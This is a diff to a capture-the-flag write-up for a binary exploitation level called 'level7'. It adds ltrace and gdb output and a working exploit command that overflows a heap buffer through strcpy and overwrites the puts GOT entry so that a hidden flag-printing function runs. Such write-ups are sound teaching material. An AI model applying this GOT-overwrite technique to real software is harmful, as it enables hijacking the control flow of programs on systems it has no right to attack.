@@ -1,4 +1,4 @@
-We can see that the program fgets() the flag and saves it in obj.c but does nothing with it.
+We can see that the program fgets() the flag and saves it in C but does nothing with it.
 There is however a function m() that prints obj.c but it is not called.
 
 This binary does 4 malloc calls in a row.
@@ -13,4 +13,33 @@ We can overflow in during the first strcpy, to overwrite the address used as des
 #4 malloc(8)	; 0x0804A038 ; destination of strcpy argv[1] 
 av[0] will have the address of puts in the GOT with 20 padding so that the address overflows into malloc #3 and replaces the address used as parameter in the second strcpy. 
 av[1] will have the address to m() to be placed in the GOT.
+
+ltrace ./level7 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
+__libc_start_main(0x8048521, 2, 0xbffff784, 0x8048610, 0x8048680 <unfinished ...>
+malloc(8)                                                       = 0x0804a008
+malloc(8)                                                       = 0x0804a018
+malloc(8)                                                       = 0x0804a028
+malloc(8)                                                       = 0x0804a038
+strcpy(0x0804a018, "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab"...)       = 0x0804a018
+strcpy(0x37614136, NULL <unfinished ...>
+--- SIGSEGV (Segmentation fault) ---
++++ killed by SIGSEGV +++
+
+gdb level7
+(gdb) info function puts
+All functions matching regular expression "puts":
+
+Non-debugging symbols:
+0x08048400  puts
+0x08048400  puts@plt
+(gdb) disass 0x08048400
+Dump of assembler code for function puts@plt:
+   0x08048400 <+0>:     jmp    *0x8049928         <----- here !!
+   0x08048406 <+6>:     push   $0x28
+   0x0804840b <+11>:    jmp    0x80483a0
+End of assembler dump.
+
+                        changes second strcpy (dst)                                     address of m
 ./level7 $(python -c "print 20 * 'A' + '\x08\x04\x99\x28'[::-1]") $(python -c "print '\x08\x04\x84\xf4'[::-1]")
+
+
